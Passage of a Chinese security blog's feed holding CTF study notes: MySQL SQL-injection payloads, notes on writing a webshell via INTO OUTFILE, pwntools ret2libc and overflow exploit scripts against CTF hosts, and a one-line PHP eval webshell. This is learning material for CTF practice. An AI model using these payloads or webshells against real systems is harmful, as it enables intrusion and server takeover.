class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h3 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multipolygon</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">linestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multilinestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br></code></pre></td></tr></table></figure><h1 id="header头注入"><a href="#header头注入" class="headerlink" title="header头注入"></a>header头注入</h1><p>http 请求头 header 中可能会存在一些与数据库有交互的数据，例如 session 持久化需要使用数据库，一些日志系统可能会记录用户访问的ua、referer等信息存放到数据库中</p><p>insert语句</p><p>谨慎些，不要插入太多次，容易造成影响与风险</p><p>——————</p><p>and已经or都可以在注释符无法使用的情况下使得语句恢复正常</p><p>——</p><p>同样没有回显，适合报错注入、</p><p>——————</p><p>sqlmap（容易造成影响）</p><p>可以使用，也可以拿到数据</p><h1 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h1><p>cookie在一些情况下会存放在数据库中， 这种情况将恶意sql拼接到cookie与数据库有交互的参数后执行，就有可能出现sql注入漏洞</p><p>————</p><p>cookie首先要是有效的，要已经登陆进去</p><p>抓包也要已登录</p><p>普通的select</p><p>——————</p><p>sqlmap</p><p>-r</p><h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>——————</p><p>使用update的语句进行注入，在于数据库交互师进行注入</p><p>——</p><p>正常的 update 语句都会在后边跟上 where 限定修改的用户名，但是在进行注入检测时，可能会发生将where username&#x3D;’admin’ 语句注释掉，导致所有用户密码被修改</p><p>为避免这种情况，在真实的环境中导致数据库全部被篡改，<strong>在update注入时应慎用注释符</strong>，改为 and ‘1’&#x3D;’1 或or ‘1’&#x3D;’1 来构建闭合（与右边的‘构成闭合（与#作用相似））（在语句与测试点之间注入），<strong>同时也应慎用 sqlmap工具检测</strong>。同样的，在遇到其它无法使用注释符 – + 、 # 的情况, 可以使用 and ‘a’&#x3D;’a 或者 or ‘a’&#x3D;’a 这种方式与右侧闭合符号凑成一对,使sql语句正常执行</p><p>——————</p><p>由于并不返回数据，则比较适合报错查询</p><p>0x7e 波浪号在开头会占用一个字符位置，使用0x2a则没有这种问题</p><p>——————</p><p>update语句在注入前已经定义了一个表，在注入时无法用来看内容</p><h1 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h1><p>当目标站点存在sql注入漏洞时，在一定条件下不仅可以读取数据库中的数据，还可以通过mysql导出文件的功能，向目标站点中写入木马，达到控制整个网站的目的</p><p>一般要写在根目录</p><p>——</p><p>show variables like ‘%secure%’;</p><p> # 查看导出路径配置</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/image.w3e5hpb1u68.webp"></p><p>可以使用相对路径，也可以使用绝对路径</p><p>注意使用两个\，一个会被当作转意符</p><p>——————</p><p>mysql用户有权限：</p><p>MySQL 用户权限简单的理解就是数据库只允许用户做你权利以内的事情,不可以越界。</p><p>比如只允许你执行 select 操作,那么你就不能执行 update 操作。</p><p>执行 LOAD DATA 、 SELECT … INTO OUTFILE 语句和 LOAD_FILE() 函数，这些操作需要用户具有 FILE权限</p><p>——</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/image.7jijdi61lho0.webp"></p><p>——————</p><p>secure_file_priv&#x3D;””</p><p>mysql.ini 文件中 secure_file_priv 为null表示不允许导出文件到任何位置</p><p> secure_file_priv&#x3D; 为空表示可以往任意位置导出文件， secure_file_priv&#x3D;D:\phpstudy_pro\WWW 表示只允许向D:\phpstudy_pro\WWW 目录导出文件</p><p>——————</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure_file_priv%&#x27;</span>; <br><span class="hljs-comment">//查看导出路径</span><br></code></pre></td></tr></table></figure><p>load_file() \ into outfile() 函数对文件的读写操作需要使用绝对路径才能将木马导入到网站所在目录</p><p>——————</p><p>获取网站路径信息</p><p>要猜解网站所在目录</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。</p>]]></content>
    
    
    <categories>
      
      <category>web总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn-第三周</title>
    <link href="/2023/01/28/pwn-%E7%AC%AC%E4%B8%89%E5%91%A8/"/>
    <url>/2023/01/28/pwn-%E7%AC%AC%E4%B8%89%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>ret2libc是控制执行libc中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)</p><p>由于PLT和GOT的延迟绑定机制 我们只可以泄露在溢出前的函数地址</p><p>检查文件</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-142958.4o3bh64591u0.webp"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-28-135010.iygxs5l9djs.webp"></p><p>找到<code>gets</code>与<code>Puts</code>函数</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-28-135035.2t4ixuw2pxs0.webp"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-194610.72ueeik4c800.webp"></p><p>泄露libc</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,25341)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscnc&#x27;)<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><span class="hljs-attribute">ret</span>=0x4006b9<br><span class="hljs-attribute">encrypt</span>=0x4009a0<br>io.recvuntil(<span class="hljs-string">&#x27;choice!\n&#x27;</span>)<br>io.sendline(str(1))<br>io.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(hex(puts_got))<br><span class="hljs-attribute">p1</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)<br>io.sendline(p1)<br><span class="hljs-attribute">puts_add</span>=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(hex(puts_add))<br>io.interactive()<br></code></pre></td></tr></table></figure><p>查找libc库</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-28-133633.3fepn87hnja0.webp"></p><p>构造exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,25341)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscnc&#x27;)<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><span class="hljs-attribute">ret</span>=0x4006b9  #栈对齐<br><span class="hljs-attribute">encrypt</span>=0x4009a0<br>io.recvuntil(<span class="hljs-string">&#x27;choice!\n&#x27;</span>)<br>io.sendline(str(1))<br>io.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(hex(puts_got))<br><span class="hljs-attribute">p1</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)<br>io.sendline(p1)<br><span class="hljs-attribute">puts_add</span>=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(hex(puts_add))<br><span class="hljs-attribute">sys</span>=puts_add-0x31580<br><span class="hljs-attribute">bs</span>=sys+0x164a5a<br>io.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br><span class="hljs-attribute">p2</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*0x57+p64(ret)+p64(pop_rdi)+p64(bs)+p64(sys)<br>io.sendline(p2)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-195322.5zljfykmcog0.webp"></p><h1 id="ctf-show萌新赛-签到题"><a href="#ctf-show萌新赛-签到题" class="headerlink" title="ctf.show萌新赛-签到题"></a>ctf.show萌新赛-签到题</h1><p>检查文件，只开启了nx</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-200707.6g7lz5czm7g0.webp"></p><p>使用gets()进行溢出，通过puts泄露的地址查找libc</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-200837.3id90jl74m00.webp"></p><p>构造exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&#x27;pwn.challenge.ctf.show&#x27;,28110)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./mxpwn&#x27;)<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">rdi_add</span>=0x400793<br><span class="hljs-attribute">ret_add</span>=0x40053e<br><span class="hljs-attribute">main_add</span>=0x400687<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x70+8)+p64(rdi_add)+p64(puts_got)+p64(puts_plt)+p64(main_add)<br>io.recvuntil(<span class="hljs-string">&#x27;successful!&#x27;</span>)<br>io.sendline(p)<br>io.recvuntil(<span class="hljs-string">&#x27;joke&#x27;</span>)<br><span class="hljs-attribute">puts_add</span>=u64(io.recv(6)+b&#x27;\x00\x00&#x27;)<br><span class="hljs-built_in">print</span>(hex(puts_add))<br>io.interactive()<br></code></pre></td></tr></table></figure><p>查找libc库</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-203005.3l3t9i3sl6g0.webp"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-203150.20c6xgdysf5s.webp"></p><p>构造exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&#x27;pwn.challenge.ctf.show&#x27;,28110)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./mxpwn&#x27;)<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">rdi_add</span>=0x400793<br><span class="hljs-attribute">ret_add</span>=0x40053e<br><span class="hljs-attribute">main_add</span>=0x400687<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x70+8)+p64(rdi_add)+p64(puts_got)+p64(puts_plt)+p64(main_add)<br>io.recvuntil(<span class="hljs-string">&#x27;successful!&#x27;</span>)<br>io.sendline(p)<br>io.recvuntil(<span class="hljs-string">&#x27;joke&#x27;</span>)<br><span class="hljs-attribute">puts_add</span>=u64(io.recv(6)+b&#x27;\x00\x00&#x27;)<br><span class="hljs-built_in">print</span>(hex(puts_add))<br><span class="hljs-attribute">sys</span>=puts_add-0x31580<br><span class="hljs-attribute">bs</span>=sys+0x164a5a<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x70+8)+p64(ret_add)+p64(rdi_add)+p64(bs)+p64(sys)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-203536.64smdq2qhho0.webp"></p><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>检查文件，开了好多</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-204345.t8ee3vyeii8.webp"></p><p>在ida中查看，我们只需要使得var[13]&#x3D;&#x3D;17LL成立</p><p>QWORD（4个字，8个字节，64位）</p><p>DWORD（2个字，4字节，32位）</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-204810.4k8dwdlp23a0.webp"></p><p>exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27540</span>)<br>p=b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">4</span>*<span class="hljs-number">13</span>)+p32(<span class="hljs-number">17</span>)<br><span class="hljs-built_in">io</span>.sendline(p)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-02-04-210150.26cpqexem474.webp"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn-第二周</title>
    <link href="/2023/01/19/pwn-%E7%AC%AC%E4%BA%8C%E5%91%A8/"/>
    <url>/2023/01/19/pwn-%E7%AC%AC%E4%BA%8C%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>检查发现开启了NX</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-184033.27qtzk020ozk.jpg"></p><p>在ida中发现了&#x2F;bin&#x2F;sh</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-184111.7g0p8qf5i268.jpg"></p><p>找到了可以利用的栈溢出漏洞</p><p>read可以读入0x200个字符，而buf只需要0x88给个字符便可以覆盖到返回地址。</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-184246.3tj6hw2a2o1s.jpg"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-184343.2brkparv9j7k.jpg"></p><p>写exp</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-143616.1iilmwzk8oyo.jpg"></p><p>连接成功</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-184949.2m5qkts0c6tc.jpg"></p><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>开启了NX与Stack，无法使用栈溢出漏洞</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-18-201849.34tuq8vocv0g.jpg"></p><p>打开发现存在&#x2F;bin&#x2F;sh</p><p>且当nptr等于随机的4位的dword_804c044相等时执行</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-185346.775kutz0yjnk.jpg"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-185525.6g7piqnrldog.jpg"></p><p>存在printf(buf),存在格式化字符串漏洞</p><p>输入AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</p><p>发现偏移量为10</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-190040.73mr9znopbls.jpg"></p><p>写exp</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-192113.73ncjn9zjr0g.jpg"></p><p>连接</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2023-01-19-192037.62xnzckbg0ao.jpg"></p><h1 id="ctf-show-PWN10"><a href="#ctf-show-PWN10" class="headerlink" title="ctf.show-PWN10"></a>ctf.show-PWN10</h1><p>照例检查文件，发现开启了NX</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-16-121140.4jf8nzqhlcao.jpg"></p><p>在ida中打开</p><p>存在printf(format),是利用格式化字符串来修改num的值使其与16相等</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-174110.5tlszuvxykg0.jpg"></p><p>连接靶机后输入AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-183700.46gwg6ctou4.jpg"></p><p>得到偏移量为7</p><p>写exp</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-183326.4oeu7g232l1c.jpg"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-19-183857.5ng5v7nb2by8.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php代码审计，flaskssti</title>
    <link href="/2023/01/14/web-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/01/14/web-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h1><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>? 通配符匹配文件名中的 0 个或 1 个字符，而 * 通配符匹配零个或多个字符</p><p>像 data(\w)?.dat 这样的模式将查找下列文件：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">data<span class="hljs-selector-class">.dat</span><br>data1<span class="hljs-selector-class">.dat</span><br>data2<span class="hljs-selector-class">.dat</span><br>datax<span class="hljs-selector-class">.dat</span><br>dataN.dat<br></code></pre></td></tr></table></figure><p>使用 * 字符代替 ? 字符扩大了找到的文件的数量。data.*.dat 匹配下列所有文件：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">data<span class="hljs-selector-class">.dat</span><br>data1<span class="hljs-selector-class">.dat</span><br>data2<span class="hljs-selector-class">.dat</span><br>data12<span class="hljs-selector-class">.dat</span><br>datax<span class="hljs-selector-class">.dat</span><br>dataXYZ.dat<br></code></pre></td></tr></table></figure><p>正则表达式的使用，可以通过简单的办法来实现强大的功能。下面先给出一个简单的示例：</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/CEBB49BB-B1AD-4539-AC7A-B40DDC62D1B2.jpg" alt="img"></p><ul><li>^ 为匹配输入字符串的开始位置。</li><li>[0-9]+匹配多个数字， [0-9] 匹配单个数字，+ 匹配一个或者多个。</li><li>abc$匹配字母 abc 并以 abc 结尾，$ 为匹配输入字符串的结束位置。</li></ul><h3 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h3><table><thead><tr><th>[ABC]</th><th>匹配 […] 中的所有字符，例如 [aeiou] 匹配字符串 “google runoob taobao” 中所有的 e o u a 字母。</th></tr></thead><tbody><tr><td>[^ABC]</td><td>匹配除了 […] 中字符的所有字符，例如 [^aeiou] 匹配字符串 “google runoob taobao” 中除了 e o u a 字母的所有字母。</td></tr><tr><td>[A-Z]</td><td>[A-Z] 表示一个区间，匹配所有大写字母，[a-z] 表示所有小写字母。</td></tr><tr><td>.</td><td>匹配除换行符（\n、\r）之外的任何单个字符，相等于 [^\n\r]。</td></tr><tr><td>[\s\S]</td><td>匹配所有。\s 是匹配所有空白符，包括换行，\S 非空白符，不包括换行。</td></tr><tr><td>\w</td><td>匹配字母、数字、下划线。等价于 [A-Za-z0-9_]</td></tr></tbody></table><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table><thead><tr><th>特别字符</th><th>描述</th></tr></thead><tbody><tr><td>$</td><td>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td></tr><tr><td>( )</td><td>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td></tr><tr><td>.</td><td>匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</td></tr><tr><td>[</td><td>标记一个中括号表达式的开始。要匹配 [，请使用 [。</td></tr><tr><td>?</td><td>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td></tr><tr><td>\</td><td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td></tr><tr><td>^</td><td>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。</td></tr><tr><td>{</td><td>标记限定符表达式的开始。要匹配 {，请使用 {。</td></tr><tr><td>|</td><td>指明两项之间的一个选择。要匹配 |，请使用 |。</td></tr></tbody></table><h3 id="PHP-正则表达式修饰符"><a href="#PHP-正则表达式修饰符" class="headerlink" title="PHP 正则表达式修饰符"></a>PHP 正则表达式修饰符</h3><p>i 忽略大小写，匹配不考虑大小写</p><p>gglobal - 全局匹配 查找所有的匹配项。</p><p>m 多行独立匹配，如果字符串不包含[n]等换行符就和普通正则一样。<br>s 设置正则符号 . 可以匹配换行符[n]，如果没有设置，正则符号.不能匹配换行符n。<br>x 忽略没有转义的空格 e eval() 对匹配后的元素执行函数。<br>A 前置锚定，约束匹配仅从目标字符串开始搜索<br>D 锁定$作为结尾，如果没有D，如果字符串包含[n]等换行符，$依旧依旧匹配换行符。如果设置了修饰符m，修饰符D 就会被忽略。<br>S 对非锚定的匹配进行分析<br>U 非贪婪，如果在正则字符量词后加“?”，就可以恢复贪婪<br>X 打开与perl 不兼容附件<br>u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要这个。建议UTF-8环境中不要使用这个</p><h2 id="常见执行函数"><a href="#常见执行函数" class="headerlink" title="常见执行函数"></a>常见执行函数</h2><h3 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h3><p>如果一个变量名后有圆括号，php将寻找与变量的值同名的函数，并且尝试执行它。</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?a=assert&amp;b=phpinfo()</span><br></code></pre></td></tr></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>将字符串当做php代码执行</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>eval函数中参数是字符</p><p>如</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 